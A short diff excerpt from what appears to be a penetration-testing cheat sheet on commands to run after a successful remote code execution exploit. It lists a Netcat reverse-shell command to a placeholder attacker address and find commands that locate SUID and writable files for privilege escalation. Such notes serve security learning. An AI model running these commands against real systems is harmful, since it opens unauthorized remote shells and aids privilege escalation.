@@ -59,3 +59,6 @@ nc -e /bin/sh <your-ip> <port>	A command used to begin a reverse shell via Netca
 find / -perm -4000 -type f 2>/dev/null	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)
 find / -writable -type  f 2>/dev/null | grep -v "/proc/"	Also helpful in privilege escalation attempts used to find files with writable permissions
 These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.
+
+
+
